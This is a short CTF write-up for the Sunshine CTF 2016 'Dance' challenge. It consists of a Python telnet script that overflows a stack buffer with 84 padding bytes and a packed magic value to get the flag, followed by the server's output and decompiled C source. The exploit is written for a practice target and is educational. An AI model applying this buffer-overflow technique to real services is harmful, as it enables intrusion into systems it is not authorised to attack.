---
title:   "Write-up - Sunshine CTF 2016 - Dance"
date:    2016-03-14 00:00:00
tags:    [Write-up, Sunshine CTF 2016]
summary: "Write-up about Sunshine CTF 2016 - Dance"
---

```
import telnetlib
import struct

x = lambda a: struct.pack('I', a)
host = "4.31.182.242"
port = "9001"

c = telnetlib.Telnet(host, port)
print c.read_until("<ENTER>")
c.write('A'*84)
c.write(x(0x12adaac9))
print c.read_all()

''' OUTPUT:
welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
give us ur sick dance moves like so:
whip,naenae,whip,whip,naenae<ENTER>

girl u can dance w the best of em. the pw to our vip lounge is: sun{d4nc3_0n_th3_s7ack}

cool dance! come again!
'''

''' BONUS:
int main() {
    memset(input, 0x0, 0x50);
    printf("welcome to the pro club.");
    fgets(input, 0x59, stdin);
    while (strlen(input) > 0x0) {
            if (sign_extend_32(*(int8_t *)input) == 0x77) {
                    input = input + 0x5;
                    do_whip();
            }
            else {
                    if (sign_extend_32(*(int8_t *)input) == 0x6e) {
                            input = input + 0x7;
                            do_naenae();
                    }
                    else {
                            input = input + 0x1;
                    }
            }
    }
    if (0x12adaac9 == 0x12adaac9) {
            if (0x0 != 0x0) {
                    printf("FLAG FLAG FLAG\n");
            }
    }
    else {
            printf("those dance moves are some dark artsz kid\n");
    }
    printf("\ncool dance! come again!\n");
    return 0x0;
}
'''
```
